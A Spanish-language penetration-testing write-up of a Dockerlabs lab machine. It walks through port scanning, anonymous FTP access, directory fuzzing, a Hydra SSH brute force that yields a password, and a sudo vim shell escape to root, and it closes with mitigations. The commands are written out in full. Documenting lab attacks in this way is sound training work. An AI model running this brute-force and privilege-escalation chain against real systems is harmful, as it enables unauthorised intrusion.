# Reporte Técnico de Pentesting: Máquina Dockerlabs

## Service Enumeration

### Full TCP Port Scan
Se ejecutó un escaneo completo de puertos TCP para identificar los servicios expuestos en la IP objetivo (`172.17.0.2`):

```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN puertos.txt
```

Servicios identificados:

21/tcp — FTP

22/tcp — SSH

80/tcp — HTTP (Apache)


Service Version Detection
Se realizó la detección de versiones sobre los puertos expuestos para analizar los servicios activos:

```
nmap -sCV -p22,80 172.17.0.2 -oN servicios.txt
```

Resultados obtenidos:

21/tcp: vsFTPd 3.0.5

22/tcp: OpenSSH 9.6p1 Ubuntu

80/tcp: Apache httpd 2.4.58 (Título del sitio web: Russoski Coaching)

Information Gathering
FTP Anonymous Access
Se identificó que el servicio FTP permite el inicio de sesión anónimo (anonymous):

Bash

```
ftp 172.17.0.2
```

Username: anonymous

Password: (Cualquier valor)

Dentro del servidor FTP se extrajeron los siguientes archivos mediante el comando mget *:

chat-gonza.txt (667 bytes)

pendientes.txt (315 bytes)

Web Enumeration & Directory Fuzzing
Se ejecutó una búsqueda de directorios ocultos en el servidor web mediante Gobuster:

Bash

```
gobuster dir -u [http://172.17.0.2/](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -t 20
```

Directorios descubiertos:

/backup (Status: 301)

/important (Status: 301)

Análisis de Información
El análisis de los archivos descargados por FTP, sumado a los directorios web y al título de la página (Russoski Coaching), permitió identificar al usuario válido del sistema: russoski.

Initial Access
SSH Brute Force Attack
Con el usuario russoski confirmado y la información recolectada para la construcción/selección de diccionarios, se ejecutó un ataque de fuerza bruta sobre el servicio SSH (22/tcp):

```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
Credenciales comprometidas:

Usuario: russoski

Contraseña: iloveme

Remote Access Established
Se estableció la conexión remota inicial vía SSH:

```
ssh russoski@172.17.0.2
```

Privilege Escalation
Enumeration of Sudo Privileges
Una vez dentro de la máquina como el usuario russoski, se revisaron los permisos especiales mediante sudo -l:

```
sudo -l
```
Salida obtenida:

Plaintext


Matching Defaults entries for russoski on 89f03dee5d47:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 89f03dee5d47:
    (root) NOPASSWD: /usr/bin/vim
Hallazgo: El usuario russoski puede ejecutar /usr/bin/vim como root sin ingresar contraseña (NOPASSWD).

Exploitation via Vim (GTFOBins)
Para escapar hacia la consola del sistema con privilegios elevados, se ejecutó vim bajo sudo invocando /bin/bash:

```
sudo vim -c ':!/bin/bash'
```
Privilege Validation
Se confirmó la escalada exitosa a la cuenta de superusuario:

```
whoami
```

# Output: root
Security Impact & Mitigations
Impacto
El compromiso total permite a un atacante tomar control absoluto del contenedor (root), leer o modificar información confidencial, alterar la configuración de los servicios e instalar persistencia.

Mitigaciones
FTP: Deshabilitar la autenticación anónima y eliminar archivos con información personal o sensible.

SSH: Deshabilitar el acceso por contraseña e implementar autenticación exclusiva por llaves SSH.

Sudoers: Remover la regla NOPASSWD para /usr/bin/vim en el archivo /etc/sudoers.
